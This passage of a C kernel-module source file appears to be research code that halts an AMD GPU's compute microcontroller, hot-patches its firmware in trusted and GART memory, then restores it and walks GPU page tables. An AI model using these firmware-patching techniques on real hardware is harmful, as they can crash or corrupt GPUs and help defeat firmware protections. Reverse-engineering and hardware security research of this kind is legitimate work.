					wr(regCP_MEC_RS64_CNTL, rs64_cntl | (1 << 4));
					udelay(100);
					wr(regCP_MEC_RS64_CNTL, rs64_cntl);
					udelay(100);
				}

				/* Method 2: IC_OP_CNTL invalidate + prime */
				{
					u32 ic_op = rr(regCP_CPC_IC_OP_CNTL);
					pr_info("fw36: IC_OP_CNTL = 0x%08X\n", ic_op);
					/* bit 0 = INVALIDATE_CACHE, bit 1 = PRIME_ICACHE */
					wr(regCP_CPC_IC_OP_CNTL, ic_op | 0x1);
					udelay(500);
					wr(regCP_CPC_IC_OP_CNTL, ic_op | 0x2);
					udelay(500);
					wr(regCP_CPC_IC_OP_CNTL, ic_op);
				}

				/* Check MEC state */
				pr_info("fw36: Post-invalidate PC = 0x%04X\n",
					rr(regCP_MEC1_INSTR_PNTR));
				pr_info("fw36: Post-invalidate RS64_CNTL = 0x%08X\n",
					rr(regCP_MEC_RS64_CNTL));
				pr_info("fw36: Post-invalidate MEC_CNTL = 0x%08X\n",
					rr(regCP_MEC_CNTL));

				/* Read scratch registers to check for any change */
				{
					int s;
					for (s = 0; s < 4; s++) {
						/* MEC scratch regs: 0x3460 + s in GC space */
						u32 scratch = rr(gc_base0 + 0x3460 + s);
						pr_info("fw36: MEC_SCRATCH_%d = 0x%08X\n",
							s, scratch);
					}
				}
			}

			/* RESTORE original instruction */
			copy_to_kernel_nofault(
				(void *)(unsigned long)(tmr_kptr + patch_off),
				&orig_instr, 4);
			udelay(100);
			copy_from_kernel_nofault(&readback,
				(void *)(unsigned long)(tmr_kptr + patch_off), 4);
			pr_info("fw36: Restored: 0x%08X %s\n",
				readback,
				readback == orig_instr ? "OK" : "FAIL");
		}

		/* e) Full halt → patch → restart test.
		 * Halt MEC, patch entry point code, restart at PRGRM_CNTR_START.
		 * If MEC re-fetches from TMR, patched code will execute. */
		pr_info("fw36: --- Full halt-patch-restart ---\n");
		{
			u32 mec_cntl_orig = rr(regCP_MEC_CNTL);
			u32 rs64_cntl_orig = rr(regCP_MEC_RS64_CNTL);
			u32 pc_before, pc_after;
			u32 scratch_before[4], scratch_after[4];
			int s;

			/* Read scratch registers before */
			for (s = 0; s < 4; s++)
				scratch_before[s] = rr(gc_base0 + 0x3460 + s);

			pc_before = rr(regCP_MEC1_INSTR_PNTR);
			pr_info("fw36: Pre-halt: PC=0x%04X MEC_CNTL=0x%08X RS64_CNTL=0x%08X\n",
				pc_before, mec_cntl_orig, rs64_cntl_orig);

			/* HALT MEC */
			wr(regCP_MEC_CNTL, mec_cntl_orig | (1 << 30));
			wr(regCP_MEC_RS64_CNTL, rs64_cntl_orig | (1 << 30));
			udelay(1000);

			pr_info("fw36: Halted: PC=0x%04X\n", rr(regCP_MEC1_INSTR_PNTR));

			/* Invalidate IC while halted */
			{
				u32 ic_op = rr(regCP_CPC_IC_OP_CNTL);
				wr(regCP_CPC_IC_OP_CNTL, ic_op | 0x1); /* invalidate */
				udelay(500);
			}

			/* Write a known sentinel to TMR at the PRGRM_CNTR_START offset.
			 * PRGRM_CNTR_START = 0x800. If word-addressed: byte offset 0x2000.
			 * We'll try writing a CSR instruction that writes 0xDEAD to
			 * a scratch register.
			 *
			 * Actually, we don't know the RS64 encoding for scratch reg writes.
			 * Instead, use a simpler test: write a JAL to PC+0 (infinite loop)
			 * at PC=0x800 equivalent, then restart and see if PC changes.
			 *
			 * But we don't know which TMR offset = PC=0x800.
			 * The most we can do is modify known code and check effects. */

			/* Write NOP sled at TMR+0x367000 (known code section) */
			{
				u32 orig_block[16];
				u32 nop_sled[16];
				int i;

				copy_from_kernel_nofault(orig_block,
					(void *)(unsigned long)(tmr_kptr + 0x367000), 64);

				for (i = 0; i < 16; i++)
					nop_sled[i] = 0x00000013; /* NOP */

				copy_to_kernel_nofault(
					(void *)(unsigned long)(tmr_kptr + 0x367000),
					nop_sled, 64);

				/* Prime IC */
				{
					u32 ic_op = rr(regCP_CPC_IC_OP_CNTL);
					wr(regCP_CPC_IC_OP_CNTL, ic_op | 0x2); /* prime */
					udelay(500);
					wr(regCP_CPC_IC_OP_CNTL, ic_op);
				}

				/* Redirect PRGRM_CNTR_START to a different address */
				wr(regCP_MEC_RS64_PRGRM_CNTR_START, 0x800);

				/* Pipe reset all pipes */
				{
					u32 rs64 = rr(regCP_MEC_RS64_CNTL);
					wr(regCP_MEC_RS64_CNTL, rs64 | 0xF0000); /* reset pipes 0-3 */
					udelay(500);
					wr(regCP_MEC_RS64_CNTL, rs64 & ~0xF0000);
				}

				/* UNHALT MEC */
				wr(regCP_MEC_CNTL, mec_cntl_orig);
				wr(regCP_MEC_RS64_CNTL, rs64_cntl_orig);
				udelay(5000);

				pc_after = rr(regCP_MEC1_INSTR_PNTR);
				for (s = 0; s < 4; s++)
					scratch_after[s] = rr(gc_base0 + 0x3460 + s);

				pr_info("fw36: Post-restart: PC=0x%04X (was 0x%04X)\n",
					pc_after, pc_before);
				for (s = 0; s < 4; s++) {
					if (scratch_after[s] != scratch_before[s])
						pr_info("fw36: MEC_SCRATCH_%d CHANGED: 0x%08X → 0x%08X\n",
							s, scratch_before[s], scratch_after[s]);
				}

				/* RESTORE original code */
				copy_to_kernel_nofault(
					(void *)(unsigned long)(tmr_kptr + 0x367000),
					orig_block, 64);
				pr_info("fw36: Restored original code at TMR+0x367000\n");
			}
		}
	}
phase17_done:

	/* ============================================================
	 * PHASE 18: FIND FIRMWARE CODE IN TMR
	 *
	 * We know the plaintext code from the firmware blob:
	 *   PC=0x000 → blob+0x2000: 04070663 00060663 6F826583 3CB22023
	 *   PC=0x4A7 → blob+0x329C: 00100393 5E722823 7B205073 7B305073
	 *
	 * Search the entire 8.4MB TMR mapping for these patterns.
	 * If found, we have the TMR offset mapping and can hot-patch.
	 *
	 * Also search the GART firmware BO (which contains the raw blob)
	 * for the code to confirm the mapping.
	 * ============================================================ */
	pr_info("fw36: ========== PHASE 18: FIND FW CODE IN TMR ==========\n");
	{
		u64 tmr_kptr = *(u64 *)((u8 *)adev + 0x3B920);
		u64 mapped_size = 0x85D000ULL;
		/* Target pattern: first 4 instructions at PC=0x000 */
		u32 pattern_pc0[4] = {0x04070663, 0x00060663, 0x6F826583, 0x3CB22023};
		/* Pattern at PC=0x4A7 */
		u32 pattern_pc4a7[4] = {0x00100393, 0x5E722823, 0x7B205073, 0x7B305073};
		u64 off;
		int found_pc0 = 0, found_pc4a7 = 0;

		if ((tmr_kptr >> 48) != 0xFFFF) {
			pr_info("fw36: TMR kptr invalid\n");
			goto phase18_done;
		}

		/* Search TMR for PC=0 code pattern */
		pr_info("fw36: Searching TMR for PC=0 pattern (04070663 00060663)...\n");
		for (off = 0; off < mapped_size - 16; off += 4) {
			u32 val;
			if (copy_from_kernel_nofault(&val,
				(void *)(unsigned long)(tmr_kptr + off), 4) != 0)
				break;

			if (val == pattern_pc0[0]) {
				/* Check next 3 words */
				u32 next[3];
				if (copy_from_kernel_nofault(next,
					(void *)(unsigned long)(tmr_kptr + off + 4), 12) == 0 &&
				    next[0] == pattern_pc0[1] &&
				    next[1] == pattern_pc0[2] &&
				    next[2] == pattern_pc0[3]) {
					pr_info("fw36: *** PC=0 CODE FOUND AT TMR+0x%llX! ***\n", off);
					found_pc0 = 1;

					/* Dump context */
					{
						u32 ctx[16];
						copy_from_kernel_nofault(ctx,
							(void *)(unsigned long)(tmr_kptr + off), 64);
						pr_info("fw36:   %08X %08X %08X %08X | %08X %08X %08X %08X\n",
							ctx[0], ctx[1], ctx[2], ctx[3],
							ctx[4], ctx[5], ctx[6], ctx[7]);
						pr_info("fw36:   %08X %08X %08X %08X | %08X %08X %08X %08X\n",
							ctx[8], ctx[9], ctx[10], ctx[11],
							ctx[12], ctx[13], ctx[14], ctx[15]);
					}

					/* Now check if PC=0x4A7 is at the expected offset */
					{
						u64 pc4a7_off = off + 0x4A7 * 4;
						u32 pc_val[4];
						if (pc4a7_off + 16 < mapped_size &&
						    copy_from_kernel_nofault(pc_val,
							(void *)(unsigned long)(tmr_kptr + pc4a7_off), 16) == 0) {
							pr_info("fw36: TMR+0x%llX (expected PC=0x4A7): %08X %08X %08X %08X\n",
								pc4a7_off, pc_val[0], pc_val[1], pc_val[2], pc_val[3]);
							if (pc_val[0] == pattern_pc4a7[0] &&
							    pc_val[1] == pattern_pc4a7[1]) {
								pr_info("fw36: *** PC=0x4A7 CONFIRMED AT TMR+0x%llX! ***\n",
									pc4a7_off);
								found_pc4a7 = 1;
							}
						}
					}
					break;
				}
			}
		}

		if (!found_pc0) {
			/* Also search for PC=0x4A7 pattern directly */
			pr_info("fw36: PC=0 not found. Searching for PC=0x4A7 pattern directly...\n");
			for (off = 0; off < mapped_size - 16; off += 4) {
				u32 val;
				if (copy_from_kernel_nofault(&val,
					(void *)(unsigned long)(tmr_kptr + off), 4) != 0)
					break;

				if (val == pattern_pc4a7[0]) {
					u32 next[3];
					if (copy_from_kernel_nofault(next,
						(void *)(unsigned long)(tmr_kptr + off + 4), 12) == 0 &&
					    next[0] == pattern_pc4a7[1] &&
					    next[1] == pattern_pc4a7[2] &&
					    next[2] == pattern_pc4a7[3]) {
						pr_info("fw36: *** PC=0x4A7 PATTERN FOUND AT TMR+0x%llX! ***\n", off);
						found_pc4a7 = 1;

						/* The code base = this offset - 0x4A7*4 = off - 0x129C */
						{
							u64 code_base = off - 0x129C;
							u32 cb_val[4];
							pr_info("fw36: Implied code base at TMR+0x%llX\n", code_base);
							if (code_base < mapped_size &&
							    copy_from_kernel_nofault(cb_val,
								(void *)(unsigned long)(tmr_kptr + code_base), 16) == 0) {
								pr_info("fw36: Code base: %08X %08X %08X %08X\n",
									cb_val[0], cb_val[1], cb_val[2], cb_val[3]);
							}
						}

						/* Dump around the found location */
						{
							u32 ctx[16];
							copy_from_kernel_nofault(ctx,
								(void *)(unsigned long)(tmr_kptr + off), 64);
							pr_info("fw36:   %08X %08X %08X %08X | %08X %08X %08X %08X\n",
								ctx[0], ctx[1], ctx[2], ctx[3],
								ctx[4], ctx[5], ctx[6], ctx[7]);
							pr_info("fw36:   %08X %08X %08X %08X | %08X %08X %08X %08X\n",
								ctx[8], ctx[9], ctx[10], ctx[11],
								ctx[12], ctx[13], ctx[14], ctx[15]);
						}
						break;
					}
				}
			}
		}

		if (!found_pc0 && !found_pc4a7) {
			pr_info("fw36: Firmware code NOT found in TMR mapping.\n");
			pr_info("fw36: Code may be in unmapped TMR region or different copy.\n");

			/* Try searching the GART firmware BO instead */
			pr_info("fw36: --- Searching GART firmware BO ---\n");
			{
				u64 gart_cpu = *(u64 *)((u8 *)adev + 0x3B968);
				if ((gart_cpu >> 48) == 0xFFFF) {
					/* The firmware BO should be ~448KB. Check header. */
					u32 hdr[4];
					if (copy_from_kernel_nofault(hdr,
						(void *)(unsigned long)gart_cpu, 16) == 0) {
						u32 file_size = hdr[0];
						pr_info("fw36: GART BO header: size=0x%X (%u KB)\n",
							file_size, file_size / 1024);

						/* Read at offset 0x2000 (where code should be) */
						{
							u32 code[8];
							if (file_size >= 0x2020 &&
							    copy_from_kernel_nofault(code,
								(void *)(unsigned long)(gart_cpu + 0x2000), 32) == 0) {
								pr_info("fw36: GART BO+0x2000: %08X %08X %08X %08X | %08X %08X %08X %08X\n",
									code[0], code[1], code[2], code[3],
									code[4], code[5], code[6], code[7]);

								if (code[0] == pattern_pc0[0] &&
								    code[1] == pattern_pc0[1]) {
									pr_info("fw36: *** CODE FOUND IN GART BO! ***\n");

									/* Read at PC=0x4A7 in GART BO */
									{
										u32 pc_code[4];
										u64 pc_off = 0x2000 + 0x4A7 * 4;
										if (copy_from_kernel_nofault(pc_code,
											(void *)(unsigned long)(gart_cpu + pc_off), 16) == 0) {
											pr_info("fw36: GART BO+0x%llX (PC=0x4A7): %08X %08X %08X %08X\n",
												pc_off, pc_code[0], pc_code[1], pc_code[2], pc_code[3]);
										}
									}
								}
							}
						}
					}
				}
			}

			/* Also check: maybe the TMR has a different copy of the firmware
			 * (gc_12_0_0 vs gc_12_0_1), or the blob offsets are different.
			 * Search for ANY common RV32 patterns at TMR+0x367000 nearby
			 * to find the code-to-TMR mapping */
			pr_info("fw36: --- Searching GART BO for CSR init pattern ---\n");
			{
				u64 gart_cpu = *(u64 *)((u8 *)adev + 0x3B968);
				if ((gart_cpu >> 48) == 0xFFFF) {
					u32 csr_pattern = 0x22D7B073; /* first CSR at TMR+0x367000 */
					u64 bo_off;
					u32 file_size;
					copy_from_kernel_nofault(&file_size,
						(void *)(unsigned long)gart_cpu, 4);

					for (bo_off = 0; bo_off < file_size && bo_off < 0x80000; bo_off += 4) {
						u32 val;
						if (copy_from_kernel_nofault(&val,
							(void *)(unsigned long)(gart_cpu + bo_off), 4) == 0 &&
						    val == csr_pattern) {
							pr_info("fw36: CSR pattern 0x%08X found at GART BO+0x%llX\n",
								csr_pattern, bo_off);

							/* This offset in BO corresponds to TMR+0x367000.
							 * So TMR offset = BO offset + (0x367000 - bo_off)
							 * Code base in TMR = TMR + (0x2000 - bo_off) + 0x367000
							 * Wait, need to think about this differently.
							 * If BO+bo_off = TMR+0x367000, then:
							 *   TMR_offset(x) = 0x367000 + (x - bo_off)
							 * So PC=0 code at BO+0x2000 would be at:
							 *   TMR + 0x367000 + (0x2000 - bo_off)
							 */
							{
								u64 tmr_code_base = 0x367000ULL + 0x2000ULL - bo_off;
								u64 tmr_pc4a7 = tmr_code_base + 0x4A7 * 4;
								pr_info("fw36: Implied TMR code base = TMR+0x%llX\n",
									tmr_code_base);
								pr_info("fw36: Implied TMR PC=0x4A7 = TMR+0x%llX\n",
									tmr_pc4a7);

								/* Verify */
								if (tmr_code_base < mapped_size) {
									u32 verify[4];
									if (copy_from_kernel_nofault(verify,
										(void *)(unsigned long)(tmr_kptr + tmr_code_base), 16) == 0) {
										pr_info("fw36: TMR code base verify: %08X %08X %08X %08X %s\n",
											verify[0], verify[1], verify[2], verify[3],
											verify[0] == pattern_pc0[0] ? "MATCH!" : "no match");
									}
								}
								if (tmr_pc4a7 < mapped_size) {
									u32 verify[4];
									if (copy_from_kernel_nofault(verify,
										(void *)(unsigned long)(tmr_kptr + tmr_pc4a7), 16) == 0) {
										pr_info("fw36: TMR PC=0x4A7 verify: %08X %08X %08X %08X %s\n",
											verify[0], verify[1], verify[2], verify[3],
											verify[0] == pattern_pc4a7[0] ? "*** MATCH! ***" : "no match");
									}
								}
							}
							break; /* stop at first match */
						}
					}
				}
			}
		}

		/* If we found the code, try a HOT-PATCH at PC=0x4A7 */
		if (found_pc4a7 || found_pc0) {
			pr_info("fw36: Hot-patch target identified!\n");
		}

		/* GART BO hot-patch test:
		 * The GART BO contains plaintext code at BO+0x2000.
		 * IC_BASE GPU VA might map here through page tables.
		 * Patch the BO, invalidate IC, force dispatch, check effect. */
		pr_info("fw36: --- GART BO HOT-PATCH TEST ---\n");
		{
			u64 gart_cpu = *(u64 *)((u8 *)adev + 0x3B968);
			u64 gart_mc = *(u64 *)((u8 *)adev + 0x3B960);

			if ((gart_cpu >> 48) == 0xFFFF) {
				/* Offsets in GART BO */
				u64 code_base = 0x2000;  /* PC=0 starts here */
				u64 pc4a7_off = code_base + 0x4A7 * 4; /* = 0x329C */
				u32 orig_instr, new_instr;
				u32 readback;

				pr_info("fw36: GART BO cpu=0x%llX mc=0x%llX\n",
					gart_cpu, gart_mc);

				/* Read original at PC=0x4A7 */
				copy_from_kernel_nofault(&orig_instr,
					(void *)(unsigned long)(gart_cpu + pc4a7_off), 4);
				pr_info("fw36: GART BO PC=0x4A7 orig: 0x%08X\n", orig_instr);

				/* Write a JAL-to-self (infinite loop): JAL x0, 0 = 0x0000006F */
				new_instr = 0x0000006F;
				copy_to_kernel_nofault(
					(void *)(unsigned long)(gart_cpu + pc4a7_off),
					&new_instr, 4);
				udelay(200);

				/* Verify write */
				copy_from_kernel_nofault(&readback,
					(void *)(unsigned long)(gart_cpu + pc4a7_off), 4);
				pr_info("fw36: GART BO PC=0x4A7 after write: 0x%08X %s\n",
					readback,
					readback == new_instr ?
					"*** WRITE OK ***" : "FAIL");

				if (readback == new_instr) {
					/* Also verify via VRAM read (MM_INDEX) to check coherence */
					{
						u64 vram_addr = gart_mc + pc4a7_off;
						u32 vram_val = vram_read32(vram_addr);
						pr_info("fw36: VRAM at MC 0x%llX: 0x%08X %s\n",
							vram_addr, vram_val,
							vram_val == new_instr ? "COHERENT" :
							(vram_val == 0xFFFFFFFF ? "PROTECTED" : "MISMATCH"));
					}

					/* Now try IC invalidation */
					{
						u32 rs64_cntl = rr(regCP_MEC_RS64_CNTL);
						u32 ic_op;

						/* Halt MEC */
						wr(regCP_MEC_CNTL, (1 << 30));
						wr(regCP_MEC_RS64_CNTL, rs64_cntl | (1 << 30));
						udelay(1000);
						pr_info("fw36: Halted PC=0x%04X\n",
							rr(regCP_MEC1_INSTR_PNTR));

						/* Invalidate IC */
						ic_op = rr(regCP_CPC_IC_OP_CNTL);
						wr(regCP_CPC_IC_OP_CNTL, ic_op | 0x1);
						udelay(1000);

						/* Prime IC from source */
						wr(regCP_CPC_IC_OP_CNTL, ic_op | 0x2);
						udelay(1000);
						wr(regCP_CPC_IC_OP_CNTL, ic_op);

						/* Reset PRGRM_CNTR_START and pipe reset */
						wr(regCP_MEC_RS64_PRGRM_CNTR_START, 0x4A7);
						udelay(100);

						/* Pipe reset */
						wr(regCP_MEC_RS64_CNTL, rs64_cntl | 0xF0000);
						udelay(500);
						wr(regCP_MEC_RS64_CNTL, rs64_cntl & ~0xF0000);
						udelay(500);

						/* Unhalt */
						wr(regCP_MEC_CNTL, 0);
						wr(regCP_MEC_RS64_CNTL, rs64_cntl);
						udelay(5000);

						pr_info("fw36: Post-patch PC=0x%04X (expected 0x4A7 if JAL-self took effect)\n",
							rr(regCP_MEC1_INSTR_PNTR));
					}

					/* Read MEC scratch regs for any changes */
					{
						int s;
						for (s = 0; s < 4; s++)
							pr_info("fw36: SCRATCH_%d = 0x%08X\n",
								s, rr(gc_base0 + 0x3460 + s));
					}

					/* RESTORE original instruction */
					copy_to_kernel_nofault(
						(void *)(unsigned long)(gart_cpu + pc4a7_off),
						&orig_instr, 4);
					udelay(200);
					copy_from_kernel_nofault(&readback,
						(void *)(unsigned long)(gart_cpu + pc4a7_off), 4);
					pr_info("fw36: Restored GART BO PC=0x4A7: 0x%08X %s\n",
						readback,
						readback == orig_instr ? "OK" : "FAIL");

					/* Unhalt MEC again to restore normal operation */
					wr(regCP_MEC_CNTL, 0);
					wr(regCP_MEC_RS64_CNTL, rr(regCP_MEC_RS64_CNTL) & ~(1 << 30));
					udelay(5000);

					pr_info("fw36: Final PC after restore = 0x%04X\n",
						rr(regCP_MEC1_INSTR_PNTR));
				}
			}
		}

		/* Also check: what is IC_BASE pointing to in MC space?
		 * Read the GPU VMID0 page table registers to understand the mapping. */
		pr_info("fw36: --- VMID0 Page Table Info ---\n");
		{
			/* VM_CONTEXT0_PAGE_TABLE_BASE_ADDR registers
			 * In GFX12 these are in MMHUB space.
			 * Try known offsets. */
			u32 vm_regs[] = {
				0x5F12,  /* mmVM_CONTEXT0_PAGE_TABLE_BASE_ADDR_LO32 */
				0x5F13,  /* mmVM_CONTEXT0_PAGE_TABLE_BASE_ADDR_HI32 */
				0x5F30,  /* mmMC_VM_SYSTEM_APERTURE_DEFAULT_ADDR_MSB */
				0x5F31,  /* mmMC_VM_SYSTEM_APERTURE_DEFAULT_ADDR_LSB */
				0x5F32,  /* mmMC_VM_SYSTEM_APERTURE_LOW_ADDR */
				0x5F33,  /* mmMC_VM_SYSTEM_APERTURE_HIGH_ADDR */
				0x5F10,  /* mmMC_VM_FB_LOCATION_BASE */
				0x5F11,  /* mmMC_VM_FB_LOCATION_TOP */
				0x5F0E,  /* mmMC_VM_FB_OFFSET */
			};
			const char *vm_names[] = {
				"PT_BASE_LO", "PT_BASE_HI",
				"SYS_APERTURE_DEFAULT_MSB", "SYS_APERTURE_DEFAULT_LSB",
				"SYS_APERTURE_LOW", "SYS_APERTURE_HIGH",
				"FB_LOCATION_BASE", "FB_LOCATION_TOP", "FB_OFFSET"
			};
			int v;
			for (v = 0; v < 9; v++) {
				u32 val = rr(vm_regs[v]);
				pr_info("fw36: %s (0x%04X) = 0x%08X\n",
					vm_names[v], vm_regs[v], val);
			}

			/* Also try MMHUB-based registers (different base) */
			pr_info("fw36: Trying MMHUB registers...\n");
			{
				/* MMHUB_BASE is typically at 0x68A8 or similar for GFX12.
				 * The VM registers in MMHUB can be at different offsets. */
				u32 mmhub_offsets[] = {
					0x68B2, 0x68B3, /* VM_CONTEXT0_PAGE_TABLE_START_ADDR */
					0x68B4, 0x68B5, /* VM_CONTEXT0_PAGE_TABLE_END_ADDR */
				};
				int m;
				for (m = 0; m < 4; m++) {
					u32 val = rr(mmhub_offsets[m]);
					pr_info("fw36: MMHUB+0x%04X = 0x%08X\n",
						mmhub_offsets[m], val);
				}
			}

			/* Read the GART controller registers */
			pr_info("fw36: GART info:\n");
			{
				u64 gart_base = *(u64 *)((u8 *)adev + 0x3B900 + 8);
				u64 gart_cpu = *(u64 *)((u8 *)adev + 0x3B900);
				pr_info("fw36: adev+0x3B908 (GART mc) = 0x%llX\n", gart_base);
				pr_info("fw36: adev+0x3B900 (GART kptr) = 0x%llX\n", gart_cpu);

				/* The GART table maps GPU VA 0x0-0x7FFF... to MC addresses.
				 * IC_BASE is 0x20681D4000 — NOT in GART range.
				 * But maybe there's an AGP/SYSTEM aperture that maps it. */
			}
		}
	}
phase18_done:

	/*
	 * PHASE 19: GFX12 PAGE TABLE WALK + IC SRAM DIRECT ACCESS
	 *
	 * Phase 18 used wrong register offsets (MMHUB v3 not GFX12).
	 * GFX12 uses GCVM_ namespace in GC block:
	 *   regGCVM_CONTEXT0_PAGE_TABLE_BASE_ADDR_LO32 = gc_base0 + 0x168F
	 *   regGCVM_CONTEXT0_PAGE_TABLE_BASE_ADDR_HI32 = gc_base0 + 0x1690
	 *   regGCVM_CONTEXT0_CNTL = gc_base0 + 0x1624
	 *
	 * Goals:
	 *  (a) Read VMID0 page table base and walk it to find IC_BASE physical backing
	 *  (b) Scan for IC SRAM direct-access registers (RS64-specific)
	 *  (c) Try TLB invalidation after GART BO patch
	 *  (d) Attempt compute dispatch to force IC miss/refetch
	 */
	pr_info("fw36: ========== PHASE 19: GFX12 PAGE TABLE WALK ==========\n");
	{
		/* Correct GFX12 GFXHUB register offsets */
		u32 vm_ctx0_cntl       = rr(gc_base0 + 0x1624);
		u32 pt_base_lo         = rr(gc_base0 + 0x168F);
		u32 pt_base_hi         = rr(gc_base0 + 0x1690);
		u32 pt_start_lo        = rr(gc_base0 + 0x16AF);
		u32 pt_start_hi        = rr(gc_base0 + 0x16B0);
		u32 pt_end_lo          = rr(gc_base0 + 0x16CF);
		u32 pt_end_hi          = rr(gc_base0 + 0x16D0);
		u64 pt_base            = ((u64)pt_base_hi << 32) | pt_base_lo;
		u64 pt_start           = ((u64)pt_start_hi << 32) | pt_start_lo;
		u64 pt_end             = ((u64)pt_end_hi << 32) | pt_end_lo;
		u64 ic_base_va         = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) |
		                         rr(regCP_CPC_IC_BASE_LO);

		pr_info("fw36: VMID0 CNTL           = 0x%08X\n", vm_ctx0_cntl);
		pr_info("fw36: VMID0 PT_BASE        = 0x%016llX\n", pt_base);
		pr_info("fw36: VMID0 PT_START       = 0x%016llX\n", pt_start);
		pr_info("fw36: VMID0 PT_END         = 0x%016llX\n", pt_end);
		pr_info("fw36: IC_BASE GPU VA       = 0x%016llX\n", ic_base_va);

		/* Parse CNTL: bit 0 = enable, bits 1-2 = page table depth */
		{
			int pt_enabled = vm_ctx0_cntl & 1;
			int pt_depth   = (vm_ctx0_cntl >> 1) & 3;
			int blk_size   = (vm_ctx0_cntl >> 4) & 0xF;
			pr_info("fw36: PT enabled=%d depth=%d block_size=%d\n",
				pt_enabled, pt_depth, blk_size);
		}

		/* Read more GFXHUB VM control registers */
		pr_info("fw36: --- Additional GFXHUB VM Registers ---\n");
		{
			/* L2 protection fault registers */
			u32 l2_fault_status_lo = rr(gc_base0 + 0x15D0);
			u32 l2_fault_status_hi = rr(gc_base0 + 0x15D1);
			u32 l2_fault_addr_lo   = rr(gc_base0 + 0x15D2);
			u32 l2_fault_addr_hi   = rr(gc_base0 + 0x15D3);
			u32 l2_fault_cntl      = rr(gc_base0 + 0x15CC);

			pr_info("fw36: L2_FAULT_CNTL        = 0x%08X\n", l2_fault_cntl);
			pr_info("fw36: L2_FAULT_STATUS       = 0x%08X_%08X\n",
				l2_fault_status_hi, l2_fault_status_lo);
			pr_info("fw36: L2_FAULT_ADDR         = 0x%08X_%08X\n",
				l2_fault_addr_hi, l2_fault_addr_lo);
		}

		/* Read all 16 VMIDs' page table bases for context */
		pr_info("fw36: --- All VMID Page Table Bases ---\n");
		{
			int v;
			for (v = 0; v < 16; v++) {
				u32 lo = rr(gc_base0 + 0x168F + v * 2);
				u32 hi = rr(gc_base0 + 0x1690 + v * 2);
				u64 base = ((u64)hi << 32) | lo;
				if (base != 0)
					pr_info("fw36: VMID%02d PT_BASE = 0x%016llX\n",
						v, base);
			}
		}

		/* If PT_BASE is non-zero, attempt page table walk for IC_BASE VA */
		if (pt_base != 0 && pt_base != 0xFFFFFFFFFFFFFFFFULL) {
			pr_info("fw36: --- PAGE TABLE WALK for IC_BASE 0x%llX ---\n",
				ic_base_va);

			/* GFX12 uses 4-level page tables (PDB2→PDB1→PDB0→PTB).
			 * PT_BASE points to PDB2 (page directory base level 2).
			 * AMD GPU page table entry format:
			 *   bits [51:12] = physical page frame number (4KB pages)
			 *   bit 0 = valid
			 *   bit 1 = system (1=system memory, 0=VRAM)
			 *   bits [4:2] = fragment size
			 *   bit 6 = further (PDE: points to next level)
			 *
			 * VA decomposition for 4-level (depth=3):
			 *   [47:39] = PDB2 index (9 bits)
			 *   [38:30] = PDB1 index (9 bits)
			 *   [29:21] = PDB0 index (9 bits)
			 *   [20:12] = PTB index  (9 bits)
			 *   [11:0]  = page offset (12 bits)
			 */
			{
				/* PT_BASE is in units of 4KB pages (shift left by 12) */
				u64 pdb_phys = (pt_base & 0xFFFFFFFFFULL) << 12;
				int depth    = (vm_ctx0_cntl >> 1) & 3;
				u32 blk_size = (vm_ctx0_cntl >> 4) & 0xF;
				u64 va       = ic_base_va;

				/* Extract VA indices based on depth */
				int shift_bits[4];
				int level;
				u64 current_base;
				int walk_ok = 1;

				pr_info("fw36: PDB phys base = 0x%llX (from PT_BASE=0x%llX)\n",
					pdb_phys, pt_base);
				pr_info("fw36: PT depth=%d block_size=%d\n", depth, blk_size);

				/* GFX12 VA bit layout depends on depth and block_size.
				 * Standard: page_offset=12, each level adds 9 bits.
				 * block_size shifts the lowest level. */
				shift_bits[0] = 12 + 9 * 0 + blk_size;  /* PTB */
				shift_bits[1] = 12 + 9 * 1 + blk_size;  /* PDB0 */
				shift_bits[2] = 12 + 9 * 2 + blk_size;  /* PDB1 */
				shift_bits[3] = 12 + 9 * 3 + blk_size;  /* PDB2 */

				pr_info("fw36: VA=0x%llX decomposition:\n", va);
				for (level = depth; level >= 0; level--) {
					int idx = (va >> shift_bits[level]) & 0x1FF;
					pr_info("fw36:   Level %d (shift %d): index %d (0x%X)\n",
						level, shift_bits[level], idx, idx);
				}

				/* Walk from the top level down */
				current_base = pdb_phys;
				for (level = depth; level >= 0 && walk_ok; level--) {
					int idx = (va >> shift_bits[level]) & 0x1FF;
					u64 entry_mc = current_base + idx * 8;
					u64 entry_val = 0;
					u64 fb_off;
					u64 tmr_kptr = *(u64 *)((u8 *)adev + 0x3B928);
					u64 tmr_mc   = *(u64 *)((u8 *)adev + 0x3B920 + 8);
					u64 tmr_size = 0x85D000;

					pr_info("fw36: Level %d: reading PTE at MC 0x%llX (idx=%d)\n",
						level, entry_mc, idx);

					/* Try to read via kernel ioremap:
					 * If entry_mc is in FB range, compute offset from FB_BASE.
					 * FB_BASE = 0x8000000000. TMR at MC 0x97FF7A3000. */
					fb_off = entry_mc - 0x8000000000ULL;

					/* Check if in TMR range */
					if (entry_mc >= tmr_mc &&
					    entry_mc < tmr_mc + tmr_size) {
						u64 tmr_off = entry_mc - tmr_mc;
						copy_from_kernel_nofault(&entry_val,
							(void *)(unsigned long)(tmr_kptr + tmr_off), 8);
						pr_info("fw36:   via TMR+0x%llX: PTE=0x%016llX\n",
							tmr_off, entry_val);
					} else {
						/* Try MM_INDEX/DATA64 for VRAM read */
						u32 lo_val, hi_val;
						lo_val = vram_read32(entry_mc);
						hi_val = vram_read32(entry_mc + 4);
						entry_val = ((u64)hi_val << 32) | lo_val;
						pr_info("fw36:   via MM_INDEX: PTE=0x%016llX%s\n",
							entry_val,
							(lo_val == 0xFFFFFFFF && hi_val == 0xFFFFFFFF)
							? " (PROTECTED)" : "");
						if (lo_val == 0xFFFFFFFF && hi_val == 0xFFFFFFFF) {
							/* Try adev gart table for system memory PTEs */
							u64 gart_kptr = *(u64 *)((u8 *)adev + 0x3B900);
							u64 gart_mc   = *(u64 *)((u8 *)adev + 0x3B908);
							if (entry_mc >= gart_mc &&
							    entry_mc < gart_mc + 0x800000 &&
							    gart_kptr) {
								u64 go = entry_mc - gart_mc;
								copy_from_kernel_nofault(&entry_val,
									(void *)(unsigned long)(gart_kptr + go), 8);
								pr_info("fw36:   via GART+0x%llX: PTE=0x%016llX\n",
									go, entry_val);
							} else {
								pr_info("fw36:   MC 0x%llX not in TMR or GART — cannot read\n",
									entry_mc);
								walk_ok = 0;
								break;
							}
						}
					}

					/* Parse PTE */
					if (entry_val != 0 && entry_val != 0xFFFFFFFFFFFFFFFFULL) {
						int valid   = entry_val & 1;
						int system  = (entry_val >> 1) & 1;
